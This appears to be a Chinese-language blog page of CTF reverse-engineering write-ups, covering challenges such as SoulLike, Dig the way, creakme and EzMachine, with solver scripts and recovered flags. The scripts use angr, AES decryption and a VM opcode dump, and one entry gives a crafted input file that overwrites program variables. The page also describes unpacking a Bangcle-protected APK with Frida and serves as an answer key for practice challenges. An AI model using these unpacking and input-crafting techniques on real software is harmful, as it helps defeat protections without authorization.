<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">rev</span><span class="params">(<span class="keyword">uint64_t</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            a^=<span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line"></span><br><span class="line">            a&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">            a|=(<span class="number">1L</span>L&lt;&lt;<span class="number">63</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            a&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llX\n&quot;</span>,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> a[] = &#123;<span class="number">0xbc8ff26d43536296</span>LL, <span class="number">0x520100780530ee16</span>LL, <span class="number">0x4dc0b5ea935f08ec</span>LL, <span class="number">0x342b90afd853f450</span>LL, <span class="number">0x8b250ebcaa2c3681</span>LL, <span class="number">0x55759f81a2c68ae4</span>LL, <span class="number">0xb0004b7679fa26b3</span>LL, <span class="number">0x25003a7475706e49</span>LL&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        a[i] = rev(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">49</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(s,a,<span class="number">48</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;

## [rev][安洵杯 2019]game

1. IDA打开，发现被ollvm 混淆过了

2. 使用deflat把能去混淆的都去混淆

   函数功能

   - blank_num 返回0的数量

   - sudoku int[9][9]

   - mem_alloc 分配输入*48大小的内存

   - general_inspection 检测是否符合规则

   - check1 交换i,i+len/2的值

     然后i,i+1交换

     然后a[i]=(a[i]&amp;0xF3|~a[i]&amp;0xC)-20

   - check3 检查&amp;打印结果

   - check2 进行最后一步变换(转化为数字)并且检查和sudoku数组是否相等

3. 最后一个trace无法deflat，~~手撸~~ 发现可以直接调试

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *data,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="keyword">uint32_t</span> d1,<span class="keyword">uint32_t</span> d2,<span class="keyword">uint32_t</span> d3,<span class="keyword">uint32_t</span> d4)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> d1*d1*d2+d1*d3+d4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> sudoku[] = &#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> dg03[]   = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> flag[<span class="number">81</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">81</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(dg03[i]!=sudoku[i])&#123;</span><br><span class="line">            flag[cnt]=sudoku[i];</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,flag,cnt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,cnt);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;cnt;i++)&#123;</span><br><span class="line">        flag[i]+=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        flag[i]=flag[i]+<span class="number">20</span>;</span><br><span class="line">        flag[i]=flag[i]&amp;<span class="number">0xF3</span>|~flag[i]&amp;<span class="number">0xC</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,flag,cnt);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;cnt/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> t=flag[i];</span><br><span class="line">        flag[i]=flag[i+cnt/<span class="number">2</span>];</span><br><span class="line">        flag[i+cnt/<span class="number">2</span>]=t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;cnt;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> t=flag[i];</span><br><span class="line">        flag[i]=flag[i+<span class="number">1</span>];</span><br><span class="line">        flag[i+<span class="number">1</span>]=t;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,flag,cnt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [rev][ACTF新生赛2020]SoulLike

1. 前4个字节为actf

2. 长度为11

3. 验证函数超级大

   rbp-0x58保存用户输入指针

4. angr一把梭(因为看了这个函数之后，发现无非就是异或相加之类的，很适合angr去求解)

   actf&#123;b0Nf|Re_LiT!

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./SoulLike&#x27;</span>)</span><br><span class="line">state = p.factory.entry_state()</span><br><span class="line">s = p.factory.simulation_manager(state)</span><br><span class="line">s.explore(find=<span class="number">0x411065</span>,avoid=<span class="number">0x411028</span>)</span><br><span class="line">print(s.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

看了wp之后发现自己粗心了，如果错了会告诉哪一位错了，所以可以按位爆破

## [rev][网鼎杯 2020 青龙组]bang

1. 梆梆加固

2. 使用frida脱壳[GitHub - GuoQiang1993/Frida-Apk-Unpack](https://github.com/GuoQiang1993/Frida-Apk-Unpack)

   网上有个之前的方法，具体看了一下，那个梆梆加固似乎没调用OpenMemory函数，所以通过hook OpenMemory函数已经不管用了。这个最新版的Hook了OpenCommon。似乎也是我手机的问题，Android 7。具体要等后续手动分析壳

   过程：通过 /proc/pid/maps查看应用对应的映射，找到相应的库，使用IDA分析

3. 使用dex2jar分析

4. 得到flag

flag&#123;borring_things&#125;

## [rev][SCTF2019]Strange apk

1. 前12个base64编码

2. 然后取奇数号字符

sctf&#123;W3lc0me~t0_An4r0id-w0rld&#125;

## [rev]Dig the way

1. 以文件作为输入

2. 注意文件是可能覆盖v8的

3. v8[3]=0&amp;&amp;v8[3]=func3(v8,2,3)=abs(v8[3])-abs(v8[3]+v8[2])+abs(v8[2])+2

   v8[2]=func2(v8,1,2)=abs(v8[1]+v8[2])-abs(v8[2])-abs(v8[1])+2

   v8[1]=1

   swap(v8[0],v8[1])

   发现不可能满足条件，遂寻找wp

4. 第一次循环交换的是v8[v12]和v8[v13]，所以可以直接覆盖v12和v13，达成函数的交换

   v8[2]=abs(v8[1])+abs(v8[2])-abs(v8[1]+v8[2])+2

   v8[3]=abs(v8[2]+v8[3])-abs(v8[2])-abs(v8[1])+2

5. 经过计算v8[2]=1,v8[3]=-1

   Offset      0  1  2  3  4  5  6  7   8  9 10 11 12 13 14 15

   00000000   3F 3F 3F 3F 3F 3F 3F 3F  3F 3F 3F 3F 3F 3F 3F 3F   
   00000016   3F 3F 3F 3F 33 33 33 33  33 33 33 33 01 00 00 00   
   00000032   FF FF FF FF 07 00 00 00  08 00 00 00  

flag: 8cda1bdb68a72a392a3968a71bdb8cda

## [rev][SCTF2019]creakme

1. 进入程序

2. 跟踪输入发现AES算法(使用PEID扫描也可以)

3. 调试发现初始向量，密钥扩展函数找到密钥

4. 密文使用base64加密了

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;sycloversyclover&#x27;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">b&#x27;nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=&#x27;</span></span><br><span class="line">c = base64.b64decode(s)</span><br><span class="line">print(len(c),c)</span><br><span class="line">aes = AES.new(key=key,mode=AES.MODE_CBC,iv=<span class="string">b&#x27;sctfsctfsctfsctf&#x27;</span>)</span><br><span class="line">p = aes.decrypt(c)</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>

## [rev][GKCTF2020]EzMachine

1. IDA搜索字符串发现不了什么，但是命令行有输出，在导入表里面发现WriteFile和WriteConsoleW

   分别在这两个函数位置下断点，发现程序使用WriteFile输出

2. 程序似乎加了壳，可以使用调试器加载，然后在要输出plz input的时候使用Scylla插件dump下来继续分析

3. WriteFile断下后，回溯分析，找到主函数D61580

4. 发现这是个虚拟机程序

5. 流程

   小写字母全部异或71后+1

   大写字母全部异或75后-1

   所有字符都除16，商和余数保存

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode</span></span><br><span class="line">opc = [<span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x11</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x11</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x2b</span>, <span class="number">0x0</span>, <span class="number">0x14</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x61</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x1a</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x7a</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0x1a</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x47</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x41</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x5a</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x4b</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x13</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x5b</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x22</span>, <span class="number">0xc</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x59</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0x4e</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 nop eip+=1</span></span><br><span class="line"><span class="string">1 v0=[eip+1],v1=[eip+2],reg[v0]=v1 eip+=3</span></span><br><span class="line"><span class="string">2 